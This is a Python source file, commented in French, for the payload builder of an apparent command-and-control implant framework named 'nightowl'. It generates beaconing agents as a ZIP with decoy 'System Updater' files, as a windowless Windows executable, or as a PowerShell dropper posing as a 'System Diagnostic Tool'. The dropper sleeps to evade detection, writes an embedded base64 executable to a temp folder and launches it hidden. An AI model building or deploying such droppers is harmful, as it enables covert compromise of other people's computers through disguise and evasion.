import io
import os
import zipfile
import base64
import yaml
import logging
import subprocess
import tempfile
import shutil
from pathlib import Path
from typing import Dict, Any

class AgentBuilder:
    def __init__(self, base_path: str):
        self.base_path = Path(base_path)
        self.agent_path = self.base_path / 'agent'
        self.logger = logging.getLogger("nightowl.builder")
        
    def generate_agent(self, config: Dict[str, Any], format_type: str, obfuscation_level: str) -> tuple[bytes, str]:
        """
        Génère l'agent sous le format demandé.
        Retourne (bytes, filename).
        """
        # Préparer la configuration
        agent_config = self._generate_config(config)
        
        if format_type == 'source':
            return self._generate_zip(agent_config, obfuscation_level), 'nightowl_agent.zip'
        elif format_type == 'powershell':
            return self._generate_powershell(agent_config, obfuscation_level), 'nightowl_agent.ps1'
        elif format_type == 'exe':
             return self._generate_exe(agent_config, obfuscation_level), 'nightowl_agent.exe'
        else:
            raise ValueError(f"Unknown format: {format_type}")

    def _generate_config(self, user_config: Dict[str, Any]) -> Dict[str, Any]:
        """Génère le dictionnaire de configuration"""
        base_config = {
            'client': {
                'server_url': user_config.get('server_url', 'http://localhost:8443'),
                'beacon_interval_min': int(user_config.get('beacon_interval_min', 5)),
                'beacon_interval_max': int(user_config.get('beacon_interval_max', 10)),
                'jitter': float(user_config.get('jitter', 0.3)),
                'verify_ssl': False
            },
            'security': {
                'aes_key_file': 'agent_key.bin',
                'rsa_key_file': 'agent_rsa.pem'
            }
        }
        return base_config

    def _generate_zip(self, config: Dict[str, Any], obfuscation: str) -> bytes:
        """Crée une archive ZIP contenant l'agent configuré"""
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Ajouter le code de l'agent
            for root, _, files in os.walk(self.agent_path):
                for file in files:
                    if file.endswith('.pyc') or file == '__pycache__' or file.startswith('.'):
                        continue
                    abs_path = os.path.join(root, file)
                    # Calculer le chemin relatif pour le zip
                    # On veut que 'agent/main.py' soit à la racine du zip dans le dossier 'agent'
                    rel_path = os.path.relpath(abs_path, self.base_path)
                    zip_file.write(abs_path, rel_path)
            
            # Ajouter run_agent.py
            run_agent_path = self.base_path / 'run_agent.py'
            if run_agent_path.exists():
                zip_file.write(run_agent_path, 'run_agent.py')
            
            # Ajouter config.yaml
            config_yaml = yaml.dump(config)
            zip_file.writestr('config.yaml', config_yaml)
            
            # Obfuscation conceptuelle
            if obfuscation in ['low', 'high']:
                # Ajouter des fichiers leurres
                zip_file.writestr('LICENSE', 'MIT License\nCopyright (c) 2024')
                zip_file.writestr('README.md', '# System Updater\nDo not delete this file.')
                
        buffer.seek(0)
        return buffer.getvalue()

    def _generate_exe(self, config: Dict[str, Any], obfuscation: str) -> bytes:
        """Génère un exécutable Windows standalone via PyInstaller"""
        # Créer un dossier temporaire pour la compilation
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            build_dir = temp_path / "build"
            dist_dir = temp_path / "dist"
            
            # Copier les sources
            agent_src = self.agent_path
            shutil.copytree(agent_src, temp_path / "agent")
            shutil.copy(self.base_path / "run_agent.py", temp_path / "run_agent.py")
            
            # Écrire la config
            with open(temp_path / "config.yaml", 'w') as f:
                yaml.dump(config, f)
                
            # Commande PyInstaller
            # --onefile : un seul exe
            # --noconsole : pas de fenêtre
            # --add-data : inclure config.yaml
            
            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--clean",
                "--distpath", str(dist_dir),
                "--workpath", str(build_dir),
                "--specpath", str(temp_path),
                "--add-data", "config.yaml;.",
                "--name", "nightowl_agent",
                str(temp_path / "run_agent.py")
            ]
            
            self.logger.info(f"Building EXE with command: {' '.join(cmd)}")
            
            # Exécuter PyInstaller
            try:
                subprocess.run(cmd, check=True, cwd=str(temp_path), capture_output=True)
            except subprocess.CalledProcessError as e:
                self.logger.error(f"PyInstaller failed: {e.stderr.decode('utf-8', errors='ignore')}")
                raise Exception("Compilation failed (PyInstaller error)")
                
            # Récupérer l'exe
            exe_path = dist_dir / "nightowl_agent.exe"
            if not exe_path.exists():
                 raise Exception("EXE not found after build")
                 
            return exe_path.read_bytes()

    def _generate_powershell(self, config: Dict[str, Any], obfuscation: str) -> bytes:
        """Génère un script PowerShell (Dropper/Launcher)"""
        # Générer l'EXE embarqué
        try:
            exe_bytes = self._generate_exe(config, obfuscation)
        except Exception as e:
            self.logger.error(f"Failed to generate EXE for PS1: {e}")
            raise Exception(f"PS1 generation failed: {e}")

        b64_exe = base64.b64encode(exe_bytes).decode('utf-8')
        
        # Déterminer les délais pour l'évasion
        sleep_time = 0
        if obfuscation == 'low':
            sleep_time = 2
        elif obfuscation == 'high':
            sleep_time = 10
            
        # Script PowerShell
        ps_script = f"""<#
.SYNOPSIS
    System Diagnostic Tool
.DESCRIPTION
    Runs internal diagnostics.
#>
$ErrorActionPreference = 'Stop'

# Evasion: Sleep
Start-Sleep -Seconds {sleep_time}

# Decode embedded agent
$b64 = "{b64_exe}"
$bytes = [System.Convert]::FromBase64String($b64)
$tempDir = [System.IO.Path]::GetTempPath() + "nw_" + [System.Guid]::NewGuid().ToString()
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
$exePath = "$tempDir\\nightowl_agent.exe"
[System.IO.File]::WriteAllBytes($exePath, $bytes)

# Execution
Write-Host "Starting agent..."
try {{
    Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction Stop
    Write-Host "Agent started successfully."
}} catch {{
    Write-Error "Failed to start agent: $_"
}}
"""
        return ps_script.encode('utf-8')
